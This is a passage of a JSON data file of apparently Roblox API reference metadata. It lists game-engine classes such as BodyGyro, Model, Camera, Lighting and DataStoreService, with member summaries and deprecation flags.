all children from open connections. Object and children may not be usable after calling Destroy.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"findFirstChild","Summary":"Use FindFirstChild() instead","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"AncestryChanged","Summary":"Fired when any of this object's ancestors change.  First argument 'child' is the object whose parent changed.  Second argument 'parent' is the first argument's new parent.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"DescendantAdded","Summary":"Fired after an Instance is parented to this object, or any of this object's descendants.  The 'descendant' argument is the Instance that is being added.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"DescendantRemoving","Summary":"Fired after an Instance is unparented from this object, or any of this object's descendants.  The 'descendant' argument is the Instance that is being added.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Changed","Summary":"Fired after a property changes value.  The property argument is the name of the property","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"BodyGyro","Summary":"Attempts to maintain a fixed orientation of its parent Part","ExplorerOrder":14,"ExplorerImageIndex":14,"Browsable":true,"PreferredParent":"","Members":[{"Name":"MaxTorque","Summary":"The maximum torque that will be exerted on the Part","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"maxTorque","Summary":"Use MaxTorque instead","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"D","Summary":"The dampening factor applied to this force","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"P","Summary":"The power continually applied to this force","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"CFrame","Summary":"The cframe that this force is trying to orient its parent Part to.  Note: this force only uses the rotation of the cframe, not the position.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"cframe","Summary":"Use CFrame instead","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"BodyPosition","Summary":"","ExplorerOrder":14,"ExplorerImageIndex":14,"Browsable":true,"PreferredParent":"","Members":[{"Name":"MaxForce","Summary":"The maximum force that will be exerted on the Part","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"maxForce","Summary":"Use MaxForce instead","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"D","Summary":"The dampening factor applied to this force","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"P","Summary":"The power factor continually applied to this force","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Position","Summary":"The Vector3 that this force is trying to position its parent Part to.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"position","Summary":"Use position instead","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"RocketPropulsion","Summary":"A propulsion system that mimics a rocket","ExplorerOrder":14,"ExplorerImageIndex":14,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"BodyVelocity","Summary":"","ExplorerOrder":14,"ExplorerImageIndex":14,"Browsable":true,"PreferredParent":"","Members":[{"Name":"MaxForce","Summary":"The maximum force that will be exerted on the Part in each axis","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"maxForce","Summary":"Use MaxForce instead","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"P","Summary":"The amount of power we add to the system.  The higher the power, the quicker the force will achieve its goal.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Velocity","Summary":"The velocity this system tries to achieve.  How quickly the system reaches this velocity (if ever) is defined by P.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"velocity","Summary":"Use Velocity instead","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"BodyAngularVelocity","Summary":"","ExplorerOrder":14,"ExplorerImageIndex":14,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"BodyForce","Summary":"When parented to a physical part, BodyForce will continually exert a force upon its parent object.","ExplorerOrder":14,"ExplorerImageIndex":14,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"BodyThrust","Summary":"","ExplorerOrder":14,"ExplorerImageIndex":14,"Browsable":true,"PreferredParent":"","Members":[{"Name":"Force","Summary":"The power continually applied to this force","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"force","Summary":"Use Force instead","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"Location","Summary":"The Vector3 location of where to apply the force to.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"location","Summary":"Use Location instead","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Hole","Summary":"","ExplorerOrder":2,"ExplorerImageIndex":0,"Browsable":true,"Deprecated":"true","PreferredParent":"","Members":[],"Preliminary":false,"IsBackend":false},{"Name":"Feature","Summary":"","ExplorerOrder":2,"ExplorerImageIndex":0,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Teams","Summary":"This Service-level object is the container for all Team objects in a level. A map that supports team games must have a Teams service. <a href=\"http://wiki.roblox.com/index.php/Team\" target=\"_blank\">More info</a>","ExplorerOrder":14,"ExplorerImageIndex":23,"Browsable":true,"PreferredParent":"","Members":[{"Name":"GetPlayers","Summary":"Returns a read-only table of players which are on this team.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Team","Summary":"The Team class is used to represent a faction in a team game. The only valid location for a Team object is under the Teams service. <a href=\"http://wiki.roblox.com/index.php/Team\" target=\"_blank\">More info</a>","ExplorerOrder":1,"ExplorerImageIndex":24,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"SpawnLocation","Summary":"","ExplorerOrder":3,"ExplorerImageIndex":25,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"NetworkClient","Summary":"","ExplorerOrder":3,"ExplorerImageIndex":16,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"NetworkServer","Summary":"","ExplorerOrder":3,"ExplorerImageIndex":15,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"LuaSourceContainer","Summary":"","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":"false","PreferredParent":"","Members":[{"Name":"CurrentEditor","Summary":"The name of the player who is currently editing the script in Team Create.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Script","Summary":"","ExplorerOrder":3,"ExplorerImageIndex":6,"Browsable":true,"PreferredParent":"","Members":[{"Name":"LinkedScript","Summary":"This property is under development. Do not use","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"LocalScript","Summary":"A script that runs on clients, NOT servers.  LocalScripts can only run when parented under the PlayerGui currently.","ExplorerOrder":4,"ExplorerImageIndex":18,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"NetworkReplicator","Summary":"","ExplorerOrder":3,"ExplorerImageIndex":29,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Model","Summary":"A construct used to group Parts and other objects together, also allows manipulation of multiple objects.","ExplorerOrder":10,"ExplorerImageIndex":2,"Browsable":true,"PreferredParent":"","Members":[{"Name":"BreakJoints","Summary":"Breaks all surface joints contained within","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"GetModelCFrame","Summary":"Returns a CFrame that has position of the centroid of all Parts in the Model.  The rotation matrix is either the rotation matrix of the user-defined PrimaryPart, or if not specified then  a part in the Model chosen by the engine.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"GetModelSize","Summary":"Returns a Vector3 that is union of the extents of all Parts in the model.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"MakeJoints","Summary":"Creates the appropriate SurfaceJoints between all touching Parts contrained within the model. Technically, this function calls MakeJoints() on all Parts inside the model.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"MoveTo","Summary":"Moves the centroid of the Model to the specified location, respecting all relative distances between parts in the model.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ResetOrientationToIdentity","Summary":"Rotates all parts in the model to the orientation that was set using SetIdentityOrientation().  If this function has never been called, rotation is reset to GetModelCFrame()'s rotation.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"SetIdentityOrientation","Summary":"Takes the current rotation matrix of the model and stores it as the model's identity matrix. The rotation is applied when ResetOrientationToIdentity() is called.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"TranslateBy","Summary":"Similar to MoveTo(), except instead of moving to an explicit location, we use the model's current CFrame location and offset it.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"GetPrimaryPartCFrame","Summary":"Returns the cframe of the Model.PrimaryPart. If PrimaryPart is nil, then this function will throw an error.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"SetPrimaryPartCFrame","Summary":"Sets the cframe of the Model.PrimaryPart. If PrimaryPart is nil, then this function will throw an error. This also sets the cframe of all descendant Parts relative to the cframe change to PrimaryPart.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"makeJoints","Summary":"Use MakeJoints() instead","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"move","Summary":"Use MoveTo() instead","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"PrimaryPart","Summary":"A Part that serves as a reference for the Model's CFrame. Used in conjunction with GetModelPrimaryPartCFrame and SetModelPrimaryPartCFrame. Use this to rotate/translate all Parts relative to the PrimaryPart.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Status","Summary":"","ExplorerOrder":10,"ExplorerImageIndex":2,"Browsable":true,"Deprecated":"true","PreferredParent":"","Members":[{"Name":"move","Summary":"Use MoveTo() instead","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false}],"Preliminary":false,"IsBackend":false},{"Name":"DataModel","Summary":"The root of ROBLOX's parent-child hierarchy (commonly known as game after the global variable used to access it)","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":true,"PreferredParent":"","Members":[{"Name":"OnClose","Summary":"Deprecated. Use DataModel.BindToClose","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"Workspace","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"workspace","Summary":"Deprecated. Use Workspace","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"ShowMouse","Summary":"Deprecated. Use Workspace.IsMouseCursorVisible","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"IsLoaded","Summary":"Returns true if the game has finished loading, false otherwise.  Check this before listening to the Loaded signal to ensure a script knows when a game finishes loading.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Loaded","Summary":"Fires when the game finishes loading.  Use this to know when to remove your custom loading gui.  It is best to check IsLoaded() before connecting to this event, as the game may load before the event is connected to.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"SetPlaceID","Summary":"Use SetPlaceId() instead","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"SetCreatorID","Summary":"Use SetCreatorId() instead","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"DataStoreService","Summary":"Responsible for storing data across multiple user created places","ExplorerOrder":-1,"ExplorerImageIndex":0,"Browsable":true,"PreferredParent":"","Members":[{"Name":"GetDataStore","Summary":"Returns a data store with the given name and scope","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"GetGlobalDataStore","Summary":"Returns the default data store","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"GetOrderedDataStore","Summary":"Returns an ordered data store with the given name and scope","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"GlobalDataStore","Summary":"Exposes functions for saving and loading data for the DataStoreService","ExplorerOrder":-1,"ExplorerImageIndex":0,"Browsable":true,"PreferredParent":"","Members":[{"Name":"OnUpdate","Summary":"Sets callback as a function to be executed any time the value associated with key is changed. It is important to disconnect the connection when the subscription to the key is no longer needed.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"GetAsync","Summary":"Returns the value of the entry in the DataStore with the given key","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"IncrementAsync","Summary":"Increments the value of a particular key amd returns the incremented value","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"SetAsync","Summary":"Sets the value of the key. This overwrites any existing data stored in the key","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"UpdateAsync","Summary":"Retrieves the value of the key from the website, and updates it with a new value. The callback until the value fetched matches the value on the web. Returning nil means it will not save.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"OrderedDataStore","Summary":"A type of DataStore where values must be positive integers. This makes OrderedDataStore suitable for leaderboard related scripting where you are required to order large amounts of data efficiently.","ExplorerOrder":-1,"ExplorerImageIndex":0,"Browsable":true,"PreferredParent":"","Members":[{"Name":"GetSortedAsync","Summary":"Returns a DataStorePages object. The length of each page is determined by pageSize, and the order is determined by isAscending. minValue and maxValue are optional parameters which will filter the result.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"HopperBin","Summary":"","ExplorerOrder":24,"ExplorerImageIndex":22,"Browsable":true,"Deprecated":"true","PreferredParent":"","Members":[],"Preliminary":false,"IsBackend":false},{"Name":"Camera","Summary":"","ExplorerOrder":0,"ExplorerImageIndex":5,"Browsable":true,"PreferredParent":"","Members":[{"Name":"CameraSubject","Summary":"Where the Camera's focus is.  Any rotation of the camera will be about this subject.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"CameraType","Summary":"Defines how the camera will behave. <a href=\"http://wiki.roblox.com/index.php/CameraType\" target=\"_blank\">More info</a>","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"CoordinateFrame","Summary":"The current position and rotation of the Camera.  For most CameraTypes, the rotation is set such that the CoordinateFrame lookVector is pointing at the Focus.","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"CFrame","Summary":"The current position and rotation of the Camera.  For most CameraTypes, the rotation is set such that the CoordinateFrame lookVector is pointing at the Focus.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"FieldOfView","Summary":"The current angle, or width, of what the camera can see.  Current acceptable values are from 20 degrees to 80.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Focus","Summary":"The current CoordinateFrame that the camera is looking at.  Note: it is not always guaranteed that the camera is always looking here.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ViewportSize","Summary":"Holds the x,y screen resolution of the viewport the camera is presenting (note: this can differ from the AbsoluteSize property of a full screen gui).","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"GetRoll","Summary":"Returns the camera's current roll. Roll is defined in radians, and is stored as the delta from the camera's y axis default normal vector.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"WorldToScreenPoint","Summary":"Takes a 3D position in the world and projects it onto x,y coordinates of screen space. Returns two values, first is a Vector3 that has x,y position and z position which is distance from camera (negative if behind camera, positive if in front). Second return value is a boolean indicating if the first argument is an on-screen coordinate.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ScreenPointToRay","Summary":"Takes a 2D screen position and produces a Ray object to be used for 3D raycasting. Input is x,y screen coordinates, and a (optional, defaults to 0) z position which sets how far in the camera look vector to start the ray origin.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ViewportPointToRay","Summary":"Same as ScreenPointToRay, except no GUI offsets are taken into account. Useful for things like casting a ray from the middle of the Camera.ViewportSize","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"WorldToViewportPoint","Summary":"Same as WorldToScreenPoint, except no GUI offsets are taken into account.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"SetRoll","Summary":"Sets the camera's current roll. Roll is defined in radians, and is stored as the delta from the camera's y axis default normal vector.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Players","Summary":"","ExplorerOrder":2,"ExplorerImageIndex":21,"Browsable":true,"PreferredParent":"","Members":[{"Name":"CharacterAutoLoads","Summary":"Set to true, when a player joins a game, they get a character automatically, as well as when they die.  When set to false, characters do not auto load and will only load in using Player:LoadCharacter().","Browsable":"true","Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"players","Summary":"Use GetPlayers() instead","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ReplicatedStorage","Summary":"A container whose contents are replicated to all clients and the server.","ExplorerOrder":3,"ExplorerImageIndex":70,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"RobloxReplicatedStorage","Summary":"","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":"false","PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ReplicatedFirst","Summary":"A container whose contents are replicated to all clients (but not back to the server) first before anything else. Useful for creating loading guis, tutorials, etc.","ExplorerOrder":3,"ExplorerImageIndex":70,"Browsable":true,"PreferredParent":"","Members":[{"Name":"RemoveRobloxLoadingScreen","Summary":"Removes the default Roblox loading screen from view. Call this when you are ready to either show your own loading gui, or when the game is ready to play.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ServerStorage","Summary":"A container whose contents are only on the server.","ExplorerOrder":3,"ExplorerImageIndex":69,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ServerScriptService","Summary":"A container whose contents should be scripts. Scripts that are added to the container are run on the server.","ExplorerOrder":3,"ExplorerImageIndex":71,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Lighting","Summary":"Responsible for all lighting aspects of the world (affects how things are rendered).","ExplorerOrder":3,"ExplorerImageIndex":13,"Browsable":true,"PreferredParent":"","Members":[{"Name":"GetMinutesAfterMidnight","Summary":"The number of minutes that the current time is past midnight.  If currently at midnight, returns 0.  Will return decimal values if not at an exact minute.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"GetMoonDirection","Summary":"Returns the lookVector (Vector3) of the moon. If this lookVector was used in a CFrame, the Part would face the moon.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"GetMoonPhase","Summary":"Currently always returns 0.75. MoonPhase cannot be edited.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"GetSunDirection","Summary":"Returns the lookVector (Vector3) of the sun. If this lookVector was used in a CFrame, the Part would face the sun.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"SetMinutesAfterMidnight","Summary":"Sets the time to be a certain number of minutes after midnight.  This works with integer and decimal values.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Ambient","Summary":"The hue of the global lighting.  Changing this changes the color tint of all objects in the Workspace.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Brightness","Summary":"How much global light each Part in the Workspace receives. Standard range is 0 to 1 (0 being little light), but can be increased all the way to 5 (colors start to be appear very different at this value).","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ColorShift_Bottom","Summary":"The hue of global lighting on the bottom surfaces of an object.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ColorShift_Top","Summary":"The hue of global lighting on the top surfaces of an object.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"FogColor","Summary":"A Color3 value that changes the hue of distance fog.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"FogEnd","Summary":"The distance at which fog completely blocks your vision. This distance is relative to the camera position. Units are in studs","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"FogStart","Summary":"The distance at which the fog gradient begins. This distance is relative to the camera position. Units are in studs.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"GeographicLatitude","Summary":"The latitude position the level is placed at.  This affects sun position. <a href=\"http://wiki.roblox.com/index.php/GeographicLatitude\" target=\"_blank\">More info</a>","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"GlobalShadows","Summary":"Flag enabling shadows from sun and moon in the place","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"OutdoorAmbient","Summary":"Effective ambient value for outdoors, effectively shadow color outdoors (requires GlobalShadows enabled)","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Outlines","Summary":"Flag enabling or disabling outlines on parts and terrain","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ShadowColor","Summary":"Color the shadows appear as. Shadows are drawn mostly for characters, but depending on the lighting will also show for Parts in the Workspace.  Rendering settings can also affect if shadows are drawn.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"TimeOfDay","Summary":"A string that represent the current time of day. Time is in 24-hour clock format \"XX::YY:ZZ\", where X is hour, Y is minute, and Z is seconds.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ClockTime","Summary":"","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"LightingChanged","Summary":"Fired whenever a property of Lighting is changed, or a skybox is added or removed. Skyboxes are of type 'Sky' and should be parented directly to lighting.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"TestService","Summary":"","ExplorerOrder":100,"ExplorerImageIndex":68,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"DebuggerManager","Summary":"","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"ScriptDebugger","Summary":"","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"DebuggerBreakpoint","Summary":"","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"DebuggerWatch","Summary":"","ExplorerOrder":0,"ExplorerImageIndex":0,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Debris","Summary":"A service that provides utility in cleaning up objects","ExplorerOrder":-1,"ExplorerImageIndex":30,"Browsable":true,"PreferredParent":"","Members":[{"Name":"addItem","Summary":"Use AddItem() instead","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"AddItem","Summary":"Adds an Instance into the debris service that will later be destroyed.  Second argument 'lifetime' is optional and specifies how long (in seconds) to wait before destroying the item. If no time is specified then the item added will automatically be destroyed in 10 seconds.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"MaxItems","Summary":"Deprecated. No replacement","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Accoutrement","Summary":"","ExplorerOrder":2,"ExplorerImageIndex":32,"Browsable":true,"PreferredParent":"","Members":[],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Player","Summary":"","ExplorerOrder":1,"ExplorerImageIndex":12,"Browsable":true,"PreferredParent":"","Members":[{"Name":"CharacterAppearance","Summary":"","Browsable":"false","Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"CameraMode","Summary":"An enum that describes how a Player's camera is allowed to behave. <a href=\"http://wiki.roblox.com/index.php/CameraMode\" target=\"_blank\">More info</a>.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"DataReady","Summary":"Read-only. If true, this Player's persistent data can be loaded, false otherwise. <a href=\"http://wiki.roblox.com/index.php/ROBLOX_Scripting_How_To:_Data_Persistence\" target=\"_blank\">Info on Data Persistence</a>.","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"DataComplexity","Summary":"","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"LoadCharacter","Summary":"Loads in a new character for this player.  This will replace the player's current character, if they have one. This should be used in conjunction with Players.CharacterAutoLoads to control spawning of characters. This function only works from a server-side script (NOT a LocalScript).","Browsable":"true","Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"LoadData","Summary":"","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"SaveData","Summary":"","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"SaveBoolean","Summary":"","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"SaveInstance","Summary":"","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"SaveString","Summary":"","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"LoadBoolean","Summary":"","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"LoadNumber","Summary":"","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"LoadString","Summary":"","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"LoadInstance","Summary":"","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"SaveNumber","Summary":"","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"playerFromCharacter","Summary":"Use GetPlayerFromCharacter() instead","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"SetUnder13","Summary":"","Browsable":true,"Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"WaitForDataReady","Summary":"Yields until the persistent data for this Player is ready to be loaded. <a href=\"http://wiki.roblox.com/index.php/ROBLOX_Scripting_How_To:_Data_Persistence\" target=\"_blank\">Info on Data Persistence</a>.","Browsable":"true","Deprecated":"true","Preliminary":false,"IsBackend":false},{"Name":"Idled","Summary":"Fired periodically after the user has been AFK for a while.  Currently this event is only fired for the *local* Player.  \"time\" is the time in seconds that the user has been idle.","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"Workspace","Summary":"","ExplorerOrder":0,"ExplorerImageIndex":19,"Browsable":true,"PreferredParent":"","Members":[{"Name":"FindPartsInRegion3","Summary":"Returns parts in the area defined by the Region3, up to specified maxCount or 100, whichever is less","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"FindPartsInRegion3WithIgnoreList","Summary":"Returns parts in the area defined by the Region3, up to specified maxCount or 100, whichever is less","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"FindPartOnRay","Summary":"Return type is (BasePart, Vector3) if the ray hits.  If it misses it will return (nil, PointAtEndOfRay)","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"FindPartOnRayWithIgnoreList","Summary":"Return type is (BasePart, Vector3) if the ray hits.  If it misses it will return (nil, PointAtEndOfRay)","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"PGSPhysicsSolverEnabled","Summary":"Boolean used to enable the experimental physics solver","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"FallenPartsDestroyHeight","Summary":"Sets the height at which falling characters and parts are destroyed. This property is not scriptable and can only be set in Studio","Browsable":true,"Deprecated":false,"Preliminary":false,"IsBackend":false}],"Deprecated":false,"Preliminary":false,"IsBackend":false},{"Name":"BasePart","Summary":"A structural class, not 